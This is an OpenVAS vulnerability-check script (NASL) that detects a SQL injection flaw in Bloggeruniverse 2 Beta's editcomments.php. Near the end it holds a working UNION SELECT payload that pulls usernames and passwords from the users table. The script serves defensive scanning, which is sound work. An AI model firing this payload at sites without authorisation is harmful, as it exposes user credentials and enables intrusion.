###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_bloggeruniverse_sql_injection_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "Bloggeruniverse version 2 Beta.";
tag_insight = "The flaw is due to input passed via the 'id' parameter to 'editcomments.php'
  is not properly sanitised before being used in SQL queries.";
tag_solution = "No solution or patch is available as of 27th September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/bloggeruniverse/";
tag_summary = "The host is running Bloggeruniverse and is prone to sql injection
  vulnerability.";

if(description)
{
  script_id(902632);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-27 17:29:53 +0200 (Tue, 27 Sep 2011)");
  script_cve_id("CVE-2009-5090");
  script_bugtraq_id(33744);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/8043/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/48697");

  script_description(desc);
  script_copyright("Copyright (c) 2011 SecPod");
  script_summary("Check if Bloggeruniverse is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/bloggeruniverse", "/blog", "/bg", cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  if("Bloggeruniverse" >< rcvRes && "CopyRight &copy;" >< rcvRes)
  {
    ## Construct the Attack Request
    url = dir + "/editcomments.php?id=-2%20union%20all%20select%201,2,3,4,5" +
             ",6,concat(0x4f70656e564153,0x3a,username,0x3a,password,0x3a,0" +
             "x4f70656e5641532d53),8%20from%20users";

    if(http_vuln_check(port:port, url:url, pattern:">openVAS:(.+):(.+):openVAS"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
